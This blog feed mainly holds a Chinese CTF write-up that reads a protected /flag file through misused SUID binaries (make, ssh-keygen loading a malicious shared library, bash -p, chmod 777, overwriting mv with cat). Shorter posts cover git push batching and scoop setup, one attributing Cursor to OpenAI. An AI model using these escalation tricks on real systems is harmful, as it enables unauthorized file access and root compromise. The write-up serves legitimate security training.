+<h3 id="23"><a href="#23" class="headerlink" title="23"></a>23</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">genisoimage -<span class="built_in">sort</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="24"><a href="#24" class="headerlink" title="24"></a>24</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="25"><a href="#25" class="headerlink" title="25"></a>25</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> <span class="built_in">cat</span> /flag \; -quit</span><br></pre></td></tr></table></figure></div>
+<p>这里后面不加<code>quit</code>会一直<code>find</code></p>
+<h3 id="26"><a href="#26" class="headerlink" title="26"></a>26</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim Makefile</span><br><span class="line">    run:</span><br><span class="line">        <span class="built_in">cat</span> /flag</span><br><span class="line"></span><br><span class="line">make run</span><br></pre></td></tr></table></figure></div>
+<p>or</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">COMMAND=<span class="string">&#x27;cat /flag&#x27;</span>;make -s --<span class="built_in">eval</span>=$<span class="string">&#x27;x:\n\t-&#x27;</span><span class="string">&quot;<span class="variable">$COMMAND</span>&quot;</span></span><br></pre></td></tr></table></figure></div>
+<p><code>-s</code>选项告诉<code>make</code>以静默模式运行，也就是不输出详细的构建信息，只显示关键信息。<br><code>--eval=$&#39;x:\n\t-&#39;&quot;$COMMAND&quot;</code>:<code>--eval</code>用于在执行<code>make</code>时求值指定的表达式；<code>$&#39;x:\n\t-&#39;&quot;COMMAND&quot;</code>是一个将表达式传递给<code>make</code>的字符串<br><code>-x</code>是一个<code>Makefile</code>规则，它指定了一个名为<code>x</code>的目标。在这个例子中，<code>x</code>是目标的名字，后面的冒号表示这是一个伪目标。<br><code>\n\t-</code>是一个转义字符序列，表示一个换行符和一个制表符。这是<code>Makefile</code>语法中规定的，用于表示命令行的缩进。<br><code>&quot;$COMMAND&quot;</code>会被展开为前面定义的<code>COMMAND</code>变量的值 ，也就是<code>cat /flag</code>。这将作为<code>x</code>目标的执行命令。</p>
+<h3 id="27"><a href="#27" class="headerlink" title="27"></a>27</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nice</span> <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="28"><a href="#28" class="headerlink" title="28"></a>28</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">timeout</span> 7d <span class="built_in">cat</span> /flag</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="29"><a href="#29" class="headerlink" title="29"></a>29</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stdbuf</span> -i0 <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="30"><a href="#30" class="headerlink" title="30"></a>30</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">setarch $(<span class="built_in">arch</span>) <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="31"><a href="#31" class="headerlink" title="31"></a>31</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">watch -x <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="32"><a href="#32" class="headerlink" title="32"></a>32</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">socat -u FILE:/flag STDOUT</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="33"><a href="#33" class="headerlink" title="33"></a>33</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">whiptail --textbox --scrolltext /flag 20 80</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="34"><a href="#34" class="headerlink" title="34"></a>34</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;print&#125;&#x27;</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="35"><a href="#35" class="headerlink" title="35"></a>35</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sed -n <span class="string">&#x27;p&#x27;</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="36"><a href="#36" class="headerlink" title="36"></a>36</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ed /flag</span><br><span class="line">,p</span><br></pre></td></tr></table></figure></div>
+<p>or</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> n | ed /flag</span><br></pre></td></tr></table></figure></div>
+<p>打开名为 <code>/flag</code> 的文件，并向 <code>ed</code> 命令传递了字符 <code>n</code>。在 <code>ed</code> 编辑器中，<code>n</code> 通常用于打印当前行的内容。</p>
+<h3 id="37"><a href="#37" class="headerlink" title="37"></a>37</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chown</span> -c hacker /flag</span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="38"><a href="#38" class="headerlink" title="38"></a>38</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 /flag &amp;&amp; <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="39"><a href="#39" class="headerlink" title="39"></a>39</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /flag /dev/stdout</span><br></pre></td></tr></table></figure></div>
+<p>震惊!原来还可以这样输出!</p>
+<h3 id="40"><a href="#40" class="headerlink" title="40"></a>40</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /usr/bin/cat /usr/bin/mv</span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="41"><a href="#41" class="headerlink" title="41"></a>41</h3><p>perl脚本</p>
+<div class="highlight-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">my</span> $flags=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">open</span>(<span class="keyword">my</span> $flag,<span class="string">&#x27;&lt;&#x27;</span>,$flags) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">&quot;Could not open file: $!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">my</span> $line = &lt;$flag&gt;)&#123;</span><br><span class="line">        <span class="keyword">print</span> $line;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">close</span> ($flag);</span><br></pre></td></tr></table></figure></div>
+<p>perl脚本和bash脚本的区别:<br>        Perl（Practical Extraction and Reporting Language）和Bash（Bourne-Again Shell）是两种不同的编程语言，它们有一些显著的区别：<br>        1. <strong>用途</strong>:<br>            - <strong>Perl</strong> 是一种通用的编程语言，专注于文本处理、数据转换、报告生成、正则表达式和系统管理等任务。Perl通常用于处理复杂的文本操作和数据处理任务。<br>            - <strong>Bash</strong> 是一种Unix Shell脚本语言，用于操作和自动化命令行环境中的任务。Bash通常用于执行系统命令、管理文件系统、编写简单的脚本以及处理系统级任务。<br>        2. <strong>语法</strong>:<br>            - <strong>Perl</strong> 具有一种更灵活和强大的语法，支持面向对象编程、函数式编程、正则表达式和高级数据结构。它有强大的字符串处理能力和大量的内置模块。<br>            - <strong>Bash</strong> 的语法相对较简单，主要用于执行命令和控制流操作。它适用于简单的脚本编写和自动化任务。<br>        3. <strong>数据类型</strong>:<br>            - <strong>Perl</strong> 具有更多的内置数据类型，包括标量（scalar）、数组（array）、哈希（hash）以及对象。它对数据处理和数据结构操作更为灵活。<br>            - <strong>Bash</strong> 主要处理文本和字符串，虽然可以处理数组，但对于更复杂的数据结构支持较弱。<br>        4. <strong>模块和库</strong>:<br>            - <strong>Perl</strong> 拥有丰富的模块和库，涵盖了各种领域，可以加速开发。CPAN（Comprehensive Perl Archive Network）是Perl社区的模块存储库，包含了大量的开源模块。<br>            - <strong>Bash</strong> 虽然有一些内置的函数和工具，但它的生态系统相对较小，通常需要依赖于外部工具和命令行实用程序来执行复杂的任务。<br>        5. <strong>适用场景</strong>:<br>            - <strong>Perl</strong> 更适合于需要复杂文本处理、正则表达式、数据转换、网络编程、脚本测试和大型应用程序开发等任务。<br>            - <strong>Bash</strong> 更适合于系统管理、自动化任务、批处理处理、简单脚本编写以及与命令行工具的交互。<br>        总之，Perl和Bash是两种不同的编程语言，各自在不同的领域和用途中具有优势。选择使用哪种语言取决于您要解决的具体问题和任务的性质。有时，它们也可以结合使用，以充分利用各自的优势。</p>
+<h3 id="42"><a href="#42" class="headerlink" title="42"></a>42</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    content = file.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="43"><a href="#43" class="headerlink" title="43"></a>43</h3><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;/flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">  file = <span class="title class_">File</span>.open(flag,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">  content = file.read</span><br><span class="line">  puts content</span><br><span class="line"><span class="keyword">rescue</span> <span class="title class_">Errno</span><span class="symbol">:</span><span class="symbol">:ENOENT</span></span><br><span class="line">  puts <span class="string">&quot;File &#x27;<span class="subst">#&#123;flag&#125;</span>&#x27; not fount.&quot;</span></span><br><span class="line"><span class="keyword">rescue</span> <span class="title class_">StandardError</span> =&gt; e</span><br><span class="line">  puts <span class="string">&quot;An error occurred: <span class="subst">#&#123;e&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">ensure</span></span><br><span class="line">  file.close <span class="keyword">if</span> file</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="44"><a href="#44" class="headerlink" title="44"></a>44</h3><p>本题最开始是和上面一样尝试写一个bash脚本，然后使用bash命令去执行，但发现依然没有权限访问flag。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line">filename=<span class="string">&quot;/flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;File &#x27;<span class="variable">$filename</span>&#x27; not found.&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> IFS= <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; <span class="string">&quot;<span class="variable">$filename</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure></div>
+<p>以上两个均会报错权限不允许<br>后经查阅发现是需要使用<code>bash -p</code> 进行提权，它的意思是以安全模式启动<code>bash</code>，因为在这里<code>bash</code>设置了<code>SUID</code> ，所以在这里是执行了之后相当于在当前命令行下执行的命令都具有bash命令的权限，然后直接使用<code>cat /flag</code> 就好了</p>
+<h3 id="45"><a href="#45" class="headerlink" title="45"></a>45</h3><p>在经过查阅<code>date</code>命令并进行尝试后试出答案，理论上是使用<code>date</code>命令直接报错输出<code>/flag</code>里面的内容</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">date</span> -f /flag</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="46"><a href="#46" class="headerlink" title="46"></a>46</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">demsg -F /flag</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="47"><a href="#47" class="headerlink" title="47"></a>47</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wc</span> -l --files0-from=/flag</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="48"><a href="#48" class="headerlink" title="48"></a>48</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -E -x c /flag</span><br></pre></td></tr></table></figure></div>
+<p>本题最初是想写一个c文件编译读取，但写完后发现不行，和<code>bash</code>那个一样<a href="###44">44</a>，经查阅后发现需要这样读取<code>/flag</code></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> result = system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error executing cat command&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+<p>这条命令告诉<code>gcc</code>命令执行预处理操作，以处理<code>/flag</code>文件中的C语言代码，<code>-E</code> 表示执行预处理操作而不进行编译，<code>-x c</code>用于指定输入文件的类型，表示输入文件是C语言代码。</p>
+<h3 id="49"><a href="#49" class="headerlink" title="49"></a>49</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">as -a /flag</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="50"><a href="#50" class="headerlink" title="50"></a>50</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lp 8088 &amp; wget --post-file=/flag http://127.0.0.1:8088</span><br></pre></td></tr></table></figure></div>
+
+<p>查看wget命令后使用了-i参数读取，读取出来了但是都是小写，没有通过，后经查阅发现需要这样使用</p>
+<h3 id="51"><a href="#51" class="headerlink" title="51"></a>51</h3><p><a class="link"   href="https://www.youtube.com/watch?v=14mIjpOXnrM&t=2878s" >related resource <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.bilibili.com/video/BV1ok4y1m75p/" >b站提取video <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">inject</span><span class="params">()</span> __<span class="title function_">attribute__</span><span class="params">((constructor))</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">C_GetFunctionList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;euid:%d\n&quot;</span>,geteuid());</span><br><span class="line">    sendfile(<span class="number">1</span>,open(<span class="string">&quot;/flag&quot;</span>,<span class="number">0</span>),<span class="number">0</span>,<span class="number">4096</span>);</span><br><span class="line">    <span class="comment">//system(&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&quot;);</span></span><br><span class="line">    <span class="type">char</span> *argvv[]=&#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-p&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    execvp(<span class="string">&quot;/bin/bash&quot;</span>,argvv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>best answer</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">C_GetFunctionList</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    sendfile(<span class="number">1</span>,open(<span class="string">&quot;/flag&quot;</span>,<span class="number">0</span>),<span class="number">0</span>,<span class="number">4096</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc level51.c -shared -o su.os</span><br><span class="line">ssh-keygen -D ./su.os</span><br></pre></td></tr></table></figure></div>
+
+<p>首先翻阅man page可以看到ssh-keygen用-D参数可以直接运行任意的共享库，如果有suid的话就能运行我们的恶意代码造成提权</p>
+<p>c程序中可以利用&lt;dlfcn.h&gt;头文件中的一系列函数dlopen，dlclose来加载运行共享库。</p>
+<p>gcc可以通过<code>-shared</code>参数来创建共享库，共享库不能单独运行，它相当于一个必须被别人调用才能运行的程序，它与普通二进制程序的区别可以通过file命令来查看，共享库没有<code>interpreter</code>这样的字段，也就是没有链接解释器。%</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>git error</title>
+    <url>/2024/07/16/error/</url>
+    <content><![CDATA[<h4 id="记录一次git-push大仓库的问题，背景是一个在本地的仓库推送到一个新仓库中-包括所有的历史提交记录"><a href="#记录一次git-push大仓库的问题，背景是一个在本地的仓库推送到一个新仓库中-包括所有的历史提交记录" class="headerlink" title="记录一次git push大仓库的问题，背景是一个在本地的仓库推送到一个新仓库中(包括所有的历史提交记录)"></a>记录一次git push大仓库的问题，背景是一个在本地的仓库推送到一个新仓库中(包括所有的历史提交记录)</h4><h2 id="git-error-failed-to-push-some-refs-to-remote"><a href="#git-error-failed-to-push-some-refs-to-remote" class="headerlink" title="git error: failed to push some refs to remote"></a>git error: failed to push some refs to remote</h2><p>这个问题是本地和远程会产生冲突，因为远程是新仓库，和本地仓库并没有联系，所以这里可以直接<code>git pull &lt;repository&gt; &lt;branch&gt; --allow-unrelated-histories</code>。</p>
+<h2 id="error-RPC-failed-HTTP-500-curl-22-The-requested-URL-returned-error-500"><a href="#error-RPC-failed-HTTP-500-curl-22-The-requested-URL-returned-error-500" class="headerlink" title="error: RPC failed; HTTP 500 curl 22 The requested URL returned error: 500"></a>error: RPC failed; HTTP 500 curl 22 The requested URL returned error: 500</h2><p>这个错误大家可能认为是网络的问题，但是我在推送的时候发现每次都是在2.43GB的时候git就会退出报出这个错误，后面查阅之后发现是Github对单次push的大小有限制，最大为2GB，具体的情况可以看<a class="link"   href="https://docs.github.com/en/get-started/using-git/troubleshooting-the-2-gb-push-limit" >Troubleshoting the 2GB push limit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>,这里我写了一个bash脚本，它能够自动一点点推送你的仓库，如下：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set remote repository and branch</span></span><br><span class="line">remote=<span class="string">&quot;rustlinux&quot;</span></span><br><span class="line">branch=<span class="string">&quot;rust&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set the number of commits to push per batch</span></span><br><span class="line">batch_size=5000</span><br><span class="line"></span><br><span class="line"><span class="comment"># the hash value provided by the user is pushed</span></span><br><span class="line"><span class="comment"># start_commit_hash=$1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if [ -z &quot;$start_commit_hash&quot; ]; then</span></span><br><span class="line">    <span class="comment"># echo &quot;No start commit hash provided. Exiting...&quot;</span></span><br><span class="line">    <span class="comment"># exit 1</span></span><br><span class="line"><span class="comment"># fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get hashed of all commits(oldest to newest)</span></span><br><span class="line">commit_hashes=$(git rev-list --reverse HEAD)</span><br><span class="line"><span class="comment"># commit_hashes=$(git rev-list --reverse $start_commit_hash..HEAD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read the hash value into an array</span></span><br><span class="line">commit_array=(<span class="variable">$commit_hashes</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calculate the total number of submissions</span></span><br><span class="line">total_commits=<span class="variable">$&#123;#commit_array[@]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># push in batches</span></span><br><span class="line"><span class="keyword">for</span> (( i=<span class="number">0</span>; i&lt;total_commits; i+=batch_size ))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    end_index=$((i + batch_size - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if it exceeds the array range</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$end_index</span> -ge <span class="variable">$total_commits</span> ]; <span class="keyword">then</span></span><br><span class="line">        end_index=$((total_commits - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the hash value of the last submission of the current batch</span></span><br><span class="line">    end_commit_hash=<span class="variable">$&#123;commit_array[$end_index]&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Pushing from commit <span class="variable">$i</span> to <span class="variable">$end_index</span>: <span class="variable">$end_commit_hash</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># push the current batch</span></span><br><span class="line">    git push <span class="variable">$remote</span> <span class="variable">$end_commit_hash</span>:<span class="variable">$branch</span> --force</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if the push is successful</span></span><br><span class="line">    <span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Error pushing to <span class="variable">$remote</span>. Stopping the script.&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Successfully pushed to <span class="variable">$remote</span> up to commit <span class="variable">$end_commit_hash</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;All commits have been successfully pushed.&quot;</span></span><br></pre></td></tr></table></figure></div>
+<p>这里额外提供了一个在运行脚本时候接收参数的功能，可以让你手动停下脚本后还可以继续从上次没有推送的hash值继续开始推送(这里要给的是上次推送时最后一次成功的hash值，而不是手动停止的那一次)</p>
+<h2 id="git功能"><a href="#git功能" class="headerlink" title="git功能"></a>git功能</h2><p><code>git gc</code>：用于优化仓库的性能和减少磁盘使用空间。</p>
+<p><code>git fsck</code>：用于验证Git仓库中所有对象的完整性和连接性，一般在<code>git gc</code>后使用</p>
+<p><code>git config --global http.postBuffer 157286400</code>: 这个是增加你的git buffer,这样可以推送更大文件。</p>
+]]></content>
+      <tags>
+        <tag>tools</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>clash keyword</title>
+    <url>/2023/10/02/clash-keyword/</url>
+    <content><![CDATA[<ul>
+<li>DOMAIN-SUFFIX：域名后缀匹配</li>
+<li>DOMAIN：域名匹配</li>
+<li>DOMAIN-KEYWORD：域名关键字匹配</li>
+<li>IP-CIDR：IP 段匹配</li>
+<li>SRC-IP-CIDR：源 IP 段匹配</li>
+<li>GEOIP：GEOIP 数据库（国家代码）匹配</li>
+<li>DST-PORT：目标端口匹配</li>
+<li>SRC-PORT：源端口匹配</li>
+<li>PROCESS-NAME：源进程名匹配</li>
+<li>RULE-SET：Rule Provider 规则匹配</li>
+<li>MATCH：全匹配</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>tools</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>scoop on git bash</title>
+    <url>/2024/08/27/scoop-on-git-bash/</url>
+    <content><![CDATA[<p>闲来无事又不想学习，折腾了一下Windows下的命令行什么的，发现<code>scoop</code>还是挺好用的，相较于<code>winget</code>，它更适合我这种比较喜欢linux命令行风格的，再加上<code>mingw</code>的<code>git-bash</code>，在<code>Windows-Terminal</code>下配上<code>oh-my-zsh</code>，实在是太舒服了。效果图如下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/PixPin_2024-08-27_21-02-58.png"
+                     
+                ></p>
+<p>下面记录一下使用过程中遇到的问题</p>
+<h4 id="miniconda安装"><a href="#miniconda安装" class="headerlink" title="miniconda安装"></a>miniconda安装</h4><p>这里可以直接<code>scoop install miniconda</code>，但是安装完成后会让你<code>conda init &lt;your shell&gt;</code>，执行这一步会报错，是一个说在<code>~/.zshrc</code>中<code>^M</code>符号有问题的，这里很自然的可以想到编码方式的不同，但是改变<code>zshrc</code>的编码方式并不能解决问题，后面找到<a class="link"   href="https://github.com/conda/conda/issues/9922#issuecomment-1361695031" >https://github.com/conda/conda/issues/9922#issuecomment-1361695031 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，把这个写入<code>zshrc</code>中，然后再在这之前加入<code>export PYTHONIOENCONFIG=utf-8</code>，然后就可以解决这个问题了。配置参考如下图：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/PixPin_2024-08-27_21-36-55.png"
+                     
+                ></p>
+<h4 id="LunarVim"><a href="#LunarVim" class="headerlink" title="LunarVim"></a>LunarVim</h4><p>直接<code>scoop install lunarvim</code>，在这之前要<code>scoop install neovim</code>一下，然后关于<code>NodeJs</code>的，建议在这之前装好<code>nvm</code>和<code>miniconda</code>，都可以使用scoop安装。对于<code>nvm</code>，在Windows下直接<code>nvm install 18</code>大概率会出错，具体可以参考<a class="link"   href="https://github.com/coreybutler/nvm-windows/issues/436" >https://github.com/coreybutler/nvm-windows/issues/436 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。所以你可以<code>nvm install latest all --insecure</code>，这里的重点在这个<code>insecure</code>。对于<code>npm</code>，可以使用<code>npm proxy http://127.0.0.1:7890</code>设置代理。</p>
+<h4 id="Cursor安装"><a href="#Cursor安装" class="headerlink" title="Cursor安装"></a>Cursor安装</h4><p><code>openai</code>推出的一个编辑器，优点在于可以使用AI辅助coding，还可以同步VsCode的所有设置和插件，非常不错，这个的安装要自己去官网下载安装包安装，然后安装的适合可以选择是否安装到命令行，对于<code>git-bash</code>下，直接<code>cursor</code>会出错，需要<code>cd $(dirname $(which cursor))</code>，然后参考<a class="link"   href="https://github.com/getcursor/cursor/issues/1121" >https://github.com/getcursor/cursor/issues/1121 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>修改<code>cursor</code>这个脚本就可以了。</p>
+<h4 id="zsh-history"><a href="#zsh-history" class="headerlink" title="zsh history"></a>zsh history</h4><p>在Windows下，我的<code>zsh</code>会将<code>history</code>全部存储在<code>/c/Users/$(Username)</code>下，然后它还不会把<code>history</code>全部存储在一个<code>.zsh_history</code>文件中，你可以使用以下命令定期对这些文件进行整理。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.zsh_history.* &gt;&gt; ~/.zsh_history</span><br><span class="line"><span class="built_in">rm</span> ~/.zsh_history.*</span><br></pre></td></tr></table></figure></div>
+
+
+<h4 id="cargo"><a href="#cargo" class="headerlink" title="cargo"></a>cargo</h4><p>直接<code>scoop install rustup</code>会在使用的时候报一个<code>link.exe</code>什么的错误，你可以这样：</p>
